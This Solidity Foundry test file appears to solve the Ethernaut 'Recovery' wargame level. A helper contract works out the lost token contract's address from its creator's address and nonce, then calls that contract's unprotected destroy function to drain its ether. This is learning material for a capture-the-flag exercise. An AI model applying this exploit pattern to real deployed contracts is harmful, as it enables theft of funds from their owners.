// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "levels/Recovery/Recovery.sol";
import "levels/Recovery/RecoveryFactory.sol";
import "./utils/EthernautTest.sol";

interface ISimpleToken {
    function destroy(address payable _recipient) external;
}

contract RecoveryHack {
    address payable public lostAddress;

    constructor(address _targetAddress) {
        lostAddress = payable(
            address(
                uint160(
                    uint256(
                        keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_targetAddress), bytes1(0x01)))
                    )
                )
            )
        );
    }

    function exploit() external {
        ISimpleToken(lostAddress).destroy(payable(address(this)));
    }
}

contract RecoveryTest is Test {
    function test_recovery() external {
        // Setup
        EthernautTest ethernautTest = new EthernautTest();
        RecoveryFactory recoveryFactory = new RecoveryFactory();
        address levelAddress = ethernautTest.setup(recoveryFactory);

        // Exploit
        vm.startPrank(tx.origin);
        RecoveryHack recoveryHack = new RecoveryHack(levelAddress);
        recoveryHack.exploit();
        vm.stopPrank();

        // Submit
        ethernautTest.submit();
    }
}
